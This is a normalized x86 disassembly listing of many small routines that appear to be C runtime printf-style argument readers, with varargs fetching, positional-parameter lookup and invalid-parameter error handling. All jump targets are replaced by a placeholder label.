retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_41924e
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4192cd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4192ec
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_41930b
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_41932a
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419349
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4193c8
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419447
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4194c6
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419545
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419564
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419583
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4195a2
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4195c1
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419640
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4196bf
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_41973e
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4197bd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4197dc
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4197fb
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_41981a
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419839
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dl [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dl
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cl [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_4198b7
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dl [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dl
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cl [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419969
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4199e8
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419a67
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419ae6
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419b65
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419b84
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419ba3
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419bc2
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419be1
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419c5e
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419cdb
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419d58
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419dd5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419df3
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419e11
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419e2f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419e4d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419ed3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419f59
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419fdf
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a0dd
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427956
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a15b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
